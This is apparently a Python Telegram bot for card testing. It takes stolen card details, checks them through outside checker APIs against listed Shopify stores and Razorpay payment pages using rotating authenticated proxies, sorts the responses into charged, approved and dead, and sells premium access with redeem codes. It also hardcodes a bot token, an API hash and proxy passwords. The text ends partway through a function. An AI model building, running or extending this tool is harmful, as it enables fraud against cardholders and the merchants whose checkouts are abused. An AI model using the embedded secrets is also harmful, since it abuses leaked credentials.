# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================
import subprocess
import sys
import importlib

REQUIRED_PACKAGES = {
    "telethon": "telethon",
    "aiohttp": "aiohttp",
    "aiofiles": "aiofiles",
}

def _install_if_missing():
    for module_name, pip_name in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(module_name)
        except ImportError:
            print(f"📦 Installing missing module: {pip_name} ...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pip_name])
                print(f"✅ Installed {pip_name}")
            except Exception as e:
                print(f"❌ Failed to install {pip_name}: {e}")
                sys.exit(1)

_install_if_missing()
# ============================================================

import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
import csv
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

# ---------- RAILWAY ENVIRONMENT SUPPORT ----------
API_ID = int(os.environ.get('API_ID', 34235059))
API_HASH = os.environ.get('API_HASH', '02583737ab7de5ac4ef9f95d1e9b7ac5')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8921031179:AAG8jE62_G9V6djbuFVp0ivLE4CReFWFzNw')

ADMIN_IDS_STR = os.environ.get('ADMIN_IDS', '8685134338,8627452729')
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(',') if x.strip()]

# ---------- API ENDPOINTS ----------
CHECKER_API_URLS = [
    'https://payu1euro-1.onrender.com/gate=payfast/cc=',
    'https://apis-9jtx.onrender.com/shopify',
    'https://shopify-api-by-chirag-production.up.railway.app/shopify',
    'http://rxl-production-c7f4.up.railway.app',
]

# ---------- CHANNELS ----------
HIT_CHANNEL_ID = int(os.environ.get('HIT_CHANNEL_ID', -1003908746727))
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', -1003938398647))
FEEDBACK_CHANNEL_ID = LOG_CHANNEL_ID
FREE_GROUP_ID = int(os.environ.get('FREE_GROUP_ID', -1003938398647))

# ---------- FORCE JOIN ----------
FORCE_JOIN_CHANNEL = os.environ.get('FORCE_JOIN_CHANNEL', 'p_r_v_l_f_s')
FORCE_JOIN_LINK = os.environ.get('FORCE_JOIN_LINK', 'https://t.me/p_r_v_l_f_s')

# ---------- FILES ----------
BANNED_FILE = 'banned.txt'
MAINTENANCE_FILE = 'maintenance.txt'
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
RAZORPAY_SITES_FILE = 'razorpay_sites.txt'
PROXY_FILE = 'proxy.txt'
CODES_FILE = 'codes.json'
WELCOME_IMAGE_PATH = 'afuona.jpg'

# ---------- DEFAULT SHOPIFY SITES ----------
DEFAULT_SITES = """06dca0-11.myshopify.com
06e92a.myshopify.com
0849fc-2.myshopify.com
0e682d-2.myshopify.com
0ebab9-3.myshopify.com
123-farm.myshopify.com
13d074-bf.myshopify.com
14aee4.myshopify.com
168580.myshopify.com
174117-2.myshopify.com
18-21-man-made.myshopify.com
1800stencil.myshopify.com
191949.myshopify.com
1f353a-4a.myshopify.com
2-moms-craft-shack.myshopify.com
20c49b-2.myshopify.com
212-performance.myshopify.com
219427.myshopify.com
22ed52.myshopify.com
24b545-5.myshopify.com
253230-2.myshopify.com
26a604.myshopify.com
26c3f1.myshopify.com
2740a4-68.myshopify.com
281c73.myshopify.com
285b44-56.myshopify.com
28fb7a-2.myshopify.com
2ad980-2.myshopify.com
2broketeachers.myshopify.com
2d5081.myshopify.com
2d7b3b.myshopify.com
2ec103-35.myshopify.com
2f63ea-3.myshopify.com
2nd-story-goods.myshopify.com
2nd-street-melrose.myshopify.com
3-broke-girlz.myshopify.com
3-sisters-embroidery.myshopify.com
313-body.myshopify.com
339058.myshopify.com
35db66-4.myshopify.com
38a8c7.myshopify.com
3abdf3-2.myshopify.com
3cac54-3.myshopify.com
3doodlerusa.myshopify.com
3rd-act.myshopify.com
4-life-time-lines.myshopify.com
426465-cd.myshopify.com
455ffe-2.myshopify.com
4732f2-a6.myshopify.com
4a6bfe-2.myshopify.com
4c69a9-d9.myshopify.com
4f0982-2.myshopify.com
4ubytia-hair.myshopify.com
5c9162-52.myshopify.com
5f6666.myshopify.com
5shiki.myshopify.com
61cda5-3.myshopify.com
6247de.myshopify.com
6388c4-3.myshopify.com
64565a-e4.myshopify.com
6564ac-4.myshopify.com
6b8076-ee.myshopify.com
751ab3-3.myshopify.com
75e247-4.myshopify.com
76d930.myshopify.com
826-boston.myshopify.com
870874.myshopify.com
893f4a-2.myshopify.com
8zgeiw-u1.myshopify.com"""

# ---------- RAZORPAY SITES ----------
DEFAULT_RAZORPAY_SITES = """https://pages.razorpay.com/hdadonation
https://pages.razorpay.com/learnastrologyonline
https://pages.razorpay.com/paynow786
https://pages.razorpay.com/jmschiguru
https://pages.razorpay.com/MudgarBeginners
https://pages.razorpay.com/thailand2026
https://pages.razorpay.com/prachyam
https://pages.razorpay.com/dakshinachitraEntryTicket
https://pages.razorpay.com/iahvgeneral
https://pages.razorpay.com/startlaunchkit
https://pages.razorpay.com/workingdrawing
https://pages.razorpay.com/chidiyaa
https://pages.razorpay.com/symates33presets
https://pages.razorpay.com/rupaifoundation
https://pages.razorpay.com/soft2
https://pages.razorpay.com/skmarketinghub
https://pages.razorpay.com/medicalnotesbundle
https://pages.razorpay.com/goroga
https://pages.razorpay.com/tapovan
https://pages.razorpay.com/GooglelinfoScraper
https://pages.razorpay.com/iprcourse2
https://pages.razorpay.com/saveourearth
https://pages.razorpay.com/umweb2026
https://pages.razorpay.com/thelanguagexukvisa
https://pages.razorpay.com/umer2024
https://pages.razorpay.com/divyasardarnews
https://pages.razorpay.com/wcsc-Gurudakshina
https://pages.razorpay.com/pl_HssrpluHBHvvMX/view
https://pages.razorpay.com/pl_IkMlROubOFCWOU/view
https://pages.razorpay.com/sewabharat
https://pages.razorpay.com/helpinhumanity
https://pages.razorpay.com/pl_R7rKLrmV3GnCna/view
https://pages.razorpay.com/donateeeducationaltechnologies
https://pages.razorpay.com/pl_Ew3tJmUKVDFiqS/view
https://pages.razorpay.com/currentconservation
https://pages.razorpay.com/pl_P9moaIi27M4KQ9/view
https://pages.razorpay.com/pl_QAiNXd2RYv9DG6/view
https://pages.razorpay.com/djvm
https://pages.razorpay.com/pl_NmcNl8EbBHhFqv/view
https://pages.razorpay.com/pl_Eko8alEva4dmfq/view
https://pages.razorpay.com/DonateTheAlDente
https://pages.razorpay.com/pl_JEPpKH6TJazJKu/view
https://pages.razorpay.com/pl_Okk7mYfMzJZ2FX/view
https://pages.razorpay.com/pl_IPmeCbjQ7MRFc8/view
https://pages.razorpay.com/pl_FKECVKNHGtPDUa/view
https://pages.razorpay.com/bssdonation
https://pages.razorpay.com/AIVA
https://pages.razorpay.com/admighty
https://pages.razorpay.com/rapid-response
https://pages.razorpay.com/pl_OMDw6dmaIIUt6F/view
https://pages.razorpay.com/cfie
https://pages.razorpay.com/adhyanconsulting
https://pages.razorpay.com/pl_JbSjVjQWYk3RAG/view
https://pages.razorpay.com/donateforwnd
https://pages.razorpay.com/merakidiaries
https://pages.razorpay.com/wmc26
https://pages.razorpay.com/arkppayfeesonline
https://pages.razorpay.com/wallstreet
https://pages.razorpay.com/pl_KHfaCsYlGGBZKH/view
https://pages.razorpay.com/pl_GaFsJX6OWoWWjD/view
https://pages.razorpay.com/pl_O46ANPEIhFm0N0/view
https://pages.razorpay.com/pl_GLtMsFFPTQcppW/view
https://pages.razorpay.com/pl_KBHnXKSXYvo5Zc/view
https://pages.razorpay.com/avallp
https://pages.razorpay.com/rakeshtravel
https://pages.razorpay.com/innovilla
https://pages.razorpay.com/pl_E1wV1olSSJ5VEP/view
https://pages.razorpay.com/Postcards
https://pages.razorpay.com/pl_Svw3J0EBezxTbA/view
https://pages.razorpay.com/pl_P4wuicOMpdGZu2/view
https://pages.razorpay.com/stores/cita
https://pages.razorpay.com/pl_PZxbhpH78vjnL6/view
https://pages.razorpay.com/pl_NOma7ltAZC3IOy/view
https://pages.razorpay.com/pl_ROY8wpLmthLBoD/view
https://pages.razorpay.com/pl_JjfmMKKvsAcxoT/view
https://pages.razorpay.com/thecoppershop
https://pages.razorpay.com/decodingdraupadicalendar2023
https://pages.razorpay.com/plutusiaspayment
https://pages.razorpay.com/wildfoodzine2023
https://pages.razorpay.com/donut-bag
https://pages.razorpay.com/pcgameshop
https://pages.razorpay.com/bigsmallkidssauce1
https://pages.razorpay.com/meshop
https://pages.razorpay.com/devaayamwellness
https://pages.razorpay.com/pl_OwJGhATxs0rtck/view
https://pages.razorpay.com/theindianotes
https://pages.razorpay.com/labhopping-desktop-calendar
https://pages.razorpay.com/cocosysltd
https://pages.razorpay.com/frdum
https://pages.razorpay.com/util-bi
https://pages.razorpay.com/acer-skyper-pro-buy
https://pages.razorpay.com/BUSINESS-299
https://pages.razorpay.com/trynbuy
https://pages.razorpay.com/vrajvrindavanbook
https://pages.razorpay.com/aryamurali
https://pages.razorpay.com/Buymeacoffe
https://pages.razorpay.com/BPROOF
https://pages.razorpay.com/buyacoffee
https://pages.razorpay.com/arpitshah
https://pages.razorpay.com/himalaya
https://pages.razorpay.com/newspaper
https://pages.razorpay.com/ididntsayit-full-set
https://pages.razorpay.com/dofc
https://pages.razorpay.com/ram01
https://pages.razorpay.com/engage
https://pages.razorpay.com/CLATEng
https://pages.razorpay.com/preorderboundlessbeauty
https://pages.razorpay.com/donateanyamountrk
https://pages.razorpay.com/devcharitabletrust
https://pages.razorpay.com/ekundli
https://pages.razorpay.com/PreorderManikyaBiography
https://pages.razorpay.com/Tally_Prime
https://pages.razorpay.com/Zomatodashboard
https://pages.razorpay.com/boutique
https://pages.razorpay.com/goldenfresh
https://pages.razorpay.com/42Cards
https://pages.razorpay.com/twfmerchandise2022
https://pages.razorpay.com/iemdaily-pen
https://pages.razorpay.com/model-f-pre-order
https://pages.razorpay.com/ZappSeva
https://pages.razorpay.com/ExcellenceOfficial
https://pages.razorpay.com/bluemask
https://pages.razorpay.com/pl_FhjOmB2c19oscS/view
https://pages.razorpay.com/smax
https://pages.razorpay.com/SeacomSkillsU
https://pages.razorpay.com/mitu-international-fees
https://pages.razorpay.com/xTUuNNwSSU
https://pages.razorpay.com/tender-fees-aivc
https://pages.razorpay.com/3-klink
https://pages.razorpay.com/pl_HlpbuOm8NccevX/view
https://pages.razorpay.com/kctiin
https://pages.razorpay.com/pl_RNnABN0aE1n7ie/view
https://pages.razorpay.com/pl_FpvQTKKTduggCT/view
https://pages.razorpay.com/pl_NlNbXF0kvLW27H/view
https://pages.razorpay.com/pl_JSFqFJNfvx5nt0/view
https://pages.razorpay.com/TtfN7NW
https://pages.razorpay.com/pl_DQUd2v6xZItOQo/view
https://pages.razorpay.com/pl_Hy637HncxCcA0b/view
https://pages.razorpay.com/cfa-2-fees
https://pages.razorpay.com/khadc
https://pages.razorpay.com/pl_QRCkxuoYVcp95H/view
https://pages.razorpay.com/ssmchTF
https://pages.razorpay.com/bsps
https://pages.razorpay.com/wvpinternational
https://pages.razorpay.com/skillmax
https://pages.razorpay.com/pl_J1vTgGrsLKbLWy/view
https://pages.razorpay.com/eagle7media
https://pages.razorpay.com/dlvpart
https://pages.razorpay.com/SoneKiChidiyaKoJagao
https://pages.razorpay.com/fnwf2025
https://pages.razorpay.com/parktickets
https://pages.razorpay.com/aguad-tickets
https://pages.razorpay.com/Pradeepjoshi-Gaaru-Appointment
https://pages.razorpay.com/pl_R9xjDcGYg5XYDk/view
https://pages.razorpay.com/ADSZIO
https://pages.razorpay.com/wecaremind-booking
https://pages.razorpay.com/baligotrips
https://pages.razorpay.com/easykitprebooking
https://pages.razorpay.com/fopenfoall"""

# ---------- DEFAULT PROXIES ----------
DEFAULT_PROXIES = """31.59.20.176:6754:fkbxofbo:m87xznhwyf75
31.56.127.193:7684:fkbxofbo:m87xznhwyf75
45.38.107.97:6014:fkbxofbo:m87xznhwyf75
198.105.121.200:6462:fkbxofbo:m87xznhwyf75
64.137.96.74:6641:fkbxofbo:m87xznhwyf75
198.23.243.226:6361:fkbxofbo:m87xznhwyf75
38.154.185.97:6370:fkbxofbo:m87xznhwyf75
84.247.60.125:6095:fkbxofbo:m87xznhwyf75
142.111.67.146:5611:fkbxofbo:m87xznhwyf75
191.96.254.138:6185:fkbxofbo:m87xznhwyf75
31.59.20.176:6754:wacsdcyr:b3yoqu1jktjd
31.56.127.193:7684:wacsdcyr:b3yoqu1jktjd
45.38.107.97:6014:wacsdcyr:b3yoqu1jktjd
198.105.121.200:6462:wacsdcyr:b3yoqu1jktjd
64.137.96.74:6641:wacsdcyr:b3yoqu1jktjd
198.23.243.226:6361:wacsdcyr:b3yoqu1jktjd
38.154.185.97:6370:wacsdcyr:b3yoqu1jktjd
84.247.60.125:6095:wacsdcyr:b3yoqu1jktjd
142.111.67.146:5611:wacsdcyr:b3yoqu1jktjd
191.96.254.138:6185:wacsdcyr:b3yoqu1jktjd
31.59.20.176:6754:bnlzisiq:gcc8xh3sjh51
31.56.127.193:7684:bnlzisiq:gcc8xh3sjh51
45.38.107.97:6014:bnlzisiq:gcc8xh3sjh51
198.105.121.200:6462:bnlzisiq:gcc8xh3sjh51
64.137.96.74:6641:bnlzisiq:gcc8xh3sjh51
198.23.243.226:6361:bnlzisiq:gcc8xh3sjh51
38.154.185.97:6370:bnlzisiq:gcc8xh3sjh51
84.247.60.125:6095:bnlzisiq:gcc8xh3sjh51
142.111.67.146:5611:bnlzisiq:gcc8xh3sjh51
191.96.254.138:6185:bnlzisiq:gcc8xh3sjh51
31.59.20.176:6754:ojrcdgtf:eoy04emsmgj1
31.56.127.193:7684:ojrcdgtf:eoy04emsmgj1
45.38.107.97:6014:ojrcdgtf:eoy04emsmgj1
198.105.121.200:6462:ojrcdgtf:eoy04emsmgj1
64.137.96.74:6641:ojrcdgtf:eoy04emsmgj1
198.23.243.226:6361:ojrcdgtf:eoy04emsmgj1
38.154.185.97:6370:ojrcdgtf:eoy04emsmgj1
84.247.60.125:6095:ojrcdgtf:eoy04emsmgj1
142.111.67.146:5611:ojrcdgtf:eoy04emsmgj1
191.96.254.138:6185:ojrcdgtf:eoy04emsmgj1
31.59.20.176:6754:fesyonaq:zppfut9aup95
31.56.127.193:7684:fesyonaq:zppfut9aup95
45.38.107.97:6014:fesyonaq:zppfut9aup95
198.105.121.200:6462:fesyonaq:zppfut9aup95
64.137.96.74:6641:fesyonaq:zppfut9aup95
198.23.243.226:6361:fesyonaq:zppfut9aup95
38.154.185.97:6370:fesyonaq:zppfut9aup95
84.247.60.125:6095:fesyonaq:zppfut9aup95
142.111.67.146:5611:fesyonaq:zppfut9aup95
191.96.254.138:6185:fesyonaq:zppfut9aup95
31.59.20.176:6754:iozzmbww:qqcbrr5hp4xf
31.56.127.193:7684:iozzmbww:qqcbrr5hp4xf
45.38.107.97:6014:iozzmbww:qqcbrr5hp4xf
198.105.121.200:6462:iozzmbww:qqcbrr5hp4xf
64.137.96.74:6641:iozzmbww:qqcbrr5hp4xf
198.23.243.226:6361:iozzmbww:qqcbrr5hp4xf
38.154.185.97:6370:iozzmbww:qqcbrr5hp4xf
84.247.60.125:6095:iozzmbww:qqcbrr5hp4xf
142.111.67.146:5611:iozzmbww:qqcbrr5hp4xf
191.96.254.138:6185:iozzmbww:qqcbrr5hp4xf
31.59.20.176:6754:rmmcqdpy:nsp0u5gf5yft
31.56.127.193:7684:rmmcqdpy:nsp0u5gf5yft
45.38.107.97:6014:rmmcqdpy:nsp0u5gf5yft
198.105.121.200:6462:rmmcqdpy:nsp0u5gf5yft
64.137.96.74:6641:rmmcqdpy:nsp0u5gf5yft
198.23.243.226:6361:rmmcqdpy:nsp0u5gf5yft
38.154.185.97:6370:rmmcqdpy:nsp0u5gf5yft
84.247.60.125:6095:rmmcqdpy:nsp0u5gf5yft
142.111.67.146:5611:rmmcqdpy:nsp0u5gf5yft
191.96.254.138:6185:rmmcqdpy:nsp0u5gf5yft
31.59.20.176:6754:jrrgaobs:j6t6ozc9wpy7
31.56.127.193:7684:jrrgaobs:j6t6ozc9wpy7
45.38.107.97:6014:jrrgaobs:j6t6ozc9wpy7
198.105.121.200:6462:jrrgaobs:j6t6ozc9wpy7
64.137.96.74:6641:jrrgaobs:j6t6ozc9wpy7
198.23.243.226:6361:jrrgaobs:j6t6ozc9wpy7
38.154.185.97:6370:jrrgaobs:j6t6ozc9wpy7
84.247.60.125:6095:jrrgaobs:j6t6ozc9wpy7
142.111.67.146:5611:jrrgaobs:j6t6ozc9wpy7
191.96.254.138:6185:jrrgaobs:j6t6ozc9wpy7"""

# ---------- EMOJIS ----------
PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159", "❌": "5121063440311386962", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "4911241630633165627",
    "📦": "5303102515301083665", "📋": "5305618829265628111", "⏳": "5303382628773161521",
    "🚀": "5303534082204920602", "⚠️": "5305473345838410805", "💎": "5305726937887433606",
    "👋": "5134653266591744867", "💡": "5231264265242954153", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5305622454218024328", "⭐": "5801104080646444587",
    "🆓": "5116382939571028928", "👑": "5303547611351902889", "🔍": "5305346287820895195",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5082628525303792441", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "💰": "5303159080020372094", "🎁": "5303464643718781111", "🎟️": "5303306877466240118",
    "📨": "5305618829265628111", "💌": "5303464643718781111", "🧾": "5303464643718781111",
    "💵": "5303159080020372094", "🎉": "5303464643718781111", "🏆": "5303547611351902889",
    "🌟": "5303547611351902889", "💯": "5305726937887433606", "🔔": "5305473345838410805",
    "📢": "5305618829265628111",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

# ---------- GLOBAL STATE ----------
active_sessions = {}
user_main_menu = {}
feedback_state = {}
auto_check_tasks = {}
admin_state = {}
admin_actions = {}

# ---------- INDICATORS ----------
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty', 'tax amount is empty',
    'payment method identifier is empty', 'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout', 'network error',
    'connection reset', 'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data', 'submit rejected', 'submit rejected:',
    'handle error', 'http 404', 'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small', 'site dead',
    'captcha_required', 'captcha required', 'site errors', 'failed', 'all products sold out',
    'no_session_token', 'tokenize_fail', 'proxy dead', 'invalid proxy format', 'no proxy',
    'inventoryreservationfailure', 'inventory reservation failure', 'invalid_payment_method',
    'invalid payment method', 'invalid_purchase_type', 'invalid purchase type',
    'payment_method_not_accepted', 'payment method not accepted', 'purchase_type_not_allowed',
    'purchase type not allowed', 'payfast', 'payu'
)

_CHARGED_INDICATORS = (
    'order placed', 'order_completed', 'order completed', 'payment successful', 'thank you',
    'charged', 'captured', 'authorized', 'completed', 'success', 'order placed successfully',
    'payment captured', 'transaction approved', 'approved successfully', 'payment_successful',
    'transaction_successful', 'payu_success', 'payfast_success', 'razorpay_success'
)

_FRAUD_INDICATORS = (
    'fraud_suspected', 'fraud suspected', 'fraud detected', 'generic_error', 'generic error',
    'declined', 'card_declined', 'card declined', 'do_not_honor', 'transaction_not_permitted',
    'pickup', 'lost_card', 'stolen_card', 'fraud', 'risk', 'suspicious', 'blocked', 'restricted',
    'invalid account', 'account closed', 'account frozen', 'hold',
)

_APPROVED_INDICATORS = (
    'approved', 'insufficient_funds', 'insufficient', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc',
    'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip',
    'incorrect zip', 'cvv', 'incorrect card number', 'invalid card number',
)

def is_charged_response(msg):
    if not msg: return False
    return any(i in str(msg).lower() for i in _CHARGED_INDICATORS)

def is_fraud_or_declined(msg):
    if not msg: return True
    lower = str(msg).lower()
    if any(i in lower for i in _FRAUD_INDICATORS): return True
    return any(p in lower for p in ('declined', 'card_declined', 'do_not_honor'))

def is_dead_indicator(msg):
    if not msg: return True
    return any(i in str(msg).lower() for i in _DEAD_INDICATORS)

def is_approved_response(msg):
    if not msg: return False
    return any(i in str(msg).lower() for i in _APPROVED_INDICATORS)

# ---------- HELPERS ----------
def is_admin(uid): return uid in ADMIN_IDS

def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except: return []

def is_banned(uid): return str(uid) in get_file_lines(BANNED_FILE)
def is_maintenance(): return os.path.exists(MAINTENANCE_FILE)
def is_free_group(cid): return cid == FREE_GROUP_ID

def toggle_maintenance():
    if os.path.exists(MAINTENANCE_FILE):
        os.remove(MAINTENANCE_FILE)
        return False
    with open(MAINTENANCE_FILE, 'w') as f: f.write('maintenance')
    return True

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites(): return get_file_lines(SITES_FILE)
def load_razorpay_sites(): return get_file_lines(RAZORPAY_SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def is_premium(uid): return str(uid) in load_premium_users()

def save_sites(s):
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for x in s: f.write(f"{x}\n")

def save_razorpay_sites(s):
    with open(RAZORPAY_SITES_FILE, 'w', encoding='utf-8') as f:
        for x in s: f.write(f"{x}\n")

def save_proxies(p):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for x in p: f.write(f"{x}\n")

def mask_card(card):
    if not card: return "****"
    p = card.split('|')
    if len(p) >= 4 and len(p[0]) >= 4:
        return f"****-****-****-{p[0][-4:]}|{p[1]}|{p[2]}|{p[3]}"
    return "****|**|****|***"

def extract_cc(text):
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    out = []
    for c, m, y, cvv in matches:
        if len(y) == 2: y = '20' + y
        out.append(f"{c}|{m}|{y}|{cvv}")
    return out

# ---------- FORCE JOIN ----------
async def is_user_joined(uid):
    if is_admin(uid): return True
    try:
        await bot(GetParticipantRequest(channel=FORCE_JOIN_CHANNEL, participant=uid))
        return True
    except UserNotParticipantError:
        return False
    except Exception as e:
        print(f"Force-join error: {e}")
        return True

def get_force_join_keyboard():
    return [
        [Button.url("📢 𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", FORCE_JOIN_LINK)],
        [Button.inline("✅ 𝗜'𝘃𝗲 𝗝𝗼𝗶𝗻𝗲𝗱", b"check_join")]
    ]

async def send_force_join_message(event):
    txt = """<b>⚠️ 𝗝𝗼𝗶𝗻 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱</b>

To use this bot, you must join our channel first.

👇 Click below then press "I've Joined"."""
    try:
        await event.reply(premium_emoji(txt), buttons=get_force_join_keyboard(), parse_mode='html')
    except:
        try:
            await event.respond(premium_emoji(txt), buttons=get_force_join_keyboard(), parse_mode='html')
        except: pass

def get_main_menu_keyboard():
    return [
        [Button.inline("𝗖𝗺𝗱", b"show_commands", style="success")],
        [Button.url("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", FORCE_JOIN_LINK, style="success")]
    ]

def get_commands_keyboard():
    return [[Button.inline(" 𝗕𝗮𝗰𝗸", b"main_menu", style="danger")]]

# ---------- PLANS ----------
PLANS = {
    'free': {'duration_days': 0, 'display': '🆓 Free'},
    '7d': {'duration_days': 7, 'display': '⭐ 7 Days Premium'},
    '30d': {'duration_days': 30, 'display': '💎 30 Days Premium'},
    'unlimited': {'duration_days': 365 * 10, 'display': '👑 Unlimited Premium'},
}

def load_codes():
    if not os.path.exists(CODES_FILE): return {}
    with open(CODES_FILE, 'r', encoding='utf-8') as f: return json.load(f)

def save_codes(c):
    with open(CODES_FILE, 'w', encoding='utf-8') as f: json.dump(c, f, indent=2)

def generate_code(plan):
    codes = load_codes()
    code = secrets.token_hex(6).upper()
    while code in codes: code = secrets.token_hex(6).upper()
    codes[code] = {'plan': plan, 'used': False, 'used_by': None, 'created_at': datetime.now().isoformat()}
    save_codes(codes)
    return code

def generate_mass_codes(plan, count):
    codes = load_codes()
    new = []
    for _ in range(count):
        code = secrets.token_hex(6).upper()
        while code in codes: code = secrets.token_hex(6).upper()
        codes[code] = {'plan': plan, 'used': False, 'used_by': None, 'created_at': datetime.now().isoformat()}
        new.append(code)
    save_codes(codes)
    return new

def redeem_code(uid, code):
    codes = load_codes()
    if code not in codes or codes[code]['used']:
        return {'success': False, 'reason': 'Invalid or already used code.'}
    plan = codes[code]['plan']
    codes[code]['used'] = True
    codes[code]['used_by'] = str(uid)
    codes[code]['used_at'] = datetime.now().isoformat()
    save_codes(codes)
    uf = f"user_{uid}.json"
    if os.path.exists(uf):
        with open(uf, 'r', encoding='utf-8') as f: ud = json.load(f)
    else: ud = {}
    ud['plan'] = plan
    ud['plan_expiry'] = (datetime.now() + timedelta(days=PLANS[plan]['duration_days'])).isoformat()
    ud['daily_checks'] = 0
    ud['last_check_date'] = datetime.now().date().isoformat()
    with open(uf, 'w', encoding='utf-8') as f: json.dump(ud, f, indent=2)
    if str(uid) not in load_premium_users():
        with open(PREMIUM_FILE, 'a', encoding='utf-8') as f: f.write(f"{uid}\n")
    return {'success': True, 'plan': plan, 'plan_display': PLANS[plan]['display'],
            'duration_days': PLANS[plan]['duration_days'], 'expiry': ud['plan_expiry']}

def get_user_plan(uid):
    uf = f"user_{uid}.json"
    if not os.path.exists(uf): return 'free'
    with open(uf, 'r', encoding='utf-8') as f: return json.load(f).get('plan', 'free')

def increment_user_checks(uid):
    uf = f"user_{uid}.json"
    if not os.path.exists(uf): return
    try:
        with open(uf, 'r', encoding='utf-8') as f: d = json.load(f)
        today = datetime.now().date().isoformat()
        if d.get('last_check_date') != today:
            d['daily_checks'] = 0
            d['last_check_date'] = today
        d['daily_checks'] = d.get('daily_checks', 0) + 1
        with open(uf, 'w', encoding='utf-8') as f: json.dump(d, f, indent=2)
    except: pass

# ---------- LOGGING ----------
async def send_log(log_type, uid, uname, message, extra=None):
    try:
        ct = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        emap = {'start': '🟢', 'check': '🔄', 'hit': '💥', 'dead': '❌', 'error': '🔴',
                'premium': '⭐', 'admin': '👑', 'redeem': '🎟️', 'mass_check': '📊',
                'feedback': '📝', 'auto_check': '🤖', 'payu_check': '💳',
                'shopify_check': '🛍️', 'razorpay_check': '💳', 'mass_code': '📨'}
        em = emap.get(log_type, '📝')
        mm = message
        for m in re.findall(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', mm):
            mm = mm.replace(m, mask_card(m))
        msg = f"""<b>{em} LOG: {log_type.upper()}</b>
<blockquote>👤 User: <code>{uid}</code></blockquote>
<blockquote>📝 Username: @{uname if uname else 'N/A'}</blockquote>
<blockquote>📅 Time: {ct}</blockquote>
<blockquote>📋 Message: {mm}</blockquote>"""
        if extra:
            for k, v in extra.items():
                if 'api' in k.lower(): continue
                if k.lower() == 'card': v = mask_card(str(v))
                msg += f"<blockquote>{k}: {v}</blockquote>"
        msg += f"\n\n<b>👑 Support:</b> @its_chirag_real "
        await bot.send_message(LOG_CHANNEL_ID, premium_emoji(msg), parse_mode='html')
    except Exception as e: print(f"Log error: {e}")

# ---------- USER STATS ----------
async def get_user_stats_text(uid, uname, cid=None):
    uf = f"user_{uid}.json"
    ud = {}
    if os.path.exists(uf):
        try:
            with open(uf, 'r', encoding='utf-8') as f: ud = json.load(f)
        except: pass
    tc = ud.get('total_checks', 0)
    sc = ud.get('successful_checks', 0)
    sc_count = len(load_sites())
    rz_count = len(load_razorpay_sites())
    px_count = len(load_proxies())
    plan = get_user_plan(uid)
    exp = ud.get('plan_expiry', '')
    if exp:
        try:
            dl = (datetime.fromisoformat(exp) - datetime.now()).days
            pd = f"{plan} ({dl}d)"
        except: pd = plan
    else: pd = plan if plan != 'free' else '🆓'
    t = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 CHIRAG 𝗯𝗼𝘁, @{uname}!\n\n"
    t += f" 𝗔𝗰𝗰𝗼𝘂𝗻𝘁   🚀 \n\n"
    t += f"    ┣ 📝 𝗣𝗹𝗮𝗻 {pd}\n"
    t += f"    ┣ 🌐 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗦𝗶𝘁𝗲𝘀  {sc_count}\n"
    t += f"    ┣ 💳 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗦𝗶𝘁𝗲𝘀  {rz_count}\n"
    t += f"    ┣ 🔌 𝗣𝗿𝗼𝘅𝗶𝗲𝘀  {px_count}\n"
    t += f"    ┣ 💥 𝗛𝗶𝘁𝘀 {sc}\n"
    t += f"    ┗ 📈 𝗧𝗼𝘁𝗮𝗹 {tc}\n\n\n"
